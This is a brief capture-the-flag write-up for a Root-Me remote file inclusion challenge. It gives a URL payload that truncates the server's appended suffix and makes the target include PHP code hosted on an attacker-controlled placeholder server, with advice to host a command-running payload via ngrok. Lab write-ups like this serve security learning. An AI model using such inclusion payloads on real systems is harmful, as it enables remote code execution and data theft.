## Challenge name: Remote File Inclusion

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)

**The server appends `_lang.php` to the `?lang` parameter (e.g., `?lang=en` becomes `en_lang.php`).**

**Use `?` to truncate the appended string:**
```
?lang=https://your-server.com/evil?
```

**Host a PHP payload on your server (e.g., ngrok) that executes commands or reads files. The server will include your remote file.**

**Use the captured flag/password to validate the challenge.**

**Thankyou.**
